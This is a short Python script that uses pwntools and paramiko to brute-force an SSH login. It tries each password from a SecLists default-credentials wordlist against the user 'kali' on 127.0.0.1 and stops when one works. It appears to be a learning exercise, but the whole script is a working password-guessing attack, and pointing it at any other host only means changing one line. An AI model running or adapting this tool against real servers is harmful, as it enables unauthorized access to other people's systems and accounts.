
#Requires pwntools installed
#Brute force SSH


from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0

with open("/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print(f'{str(attempts).rjust(10)} - Attempting password: {password}')
			response = ssh(host=host, user=username, password=password, timeout=1)

			if response.connected():
				print(" >> Valid password found")
				response.close()
				break
			response.close()

		except paramiko.ssh_exception.AuthenticationException:
			print("INVALID Password")
			
		attempts += 1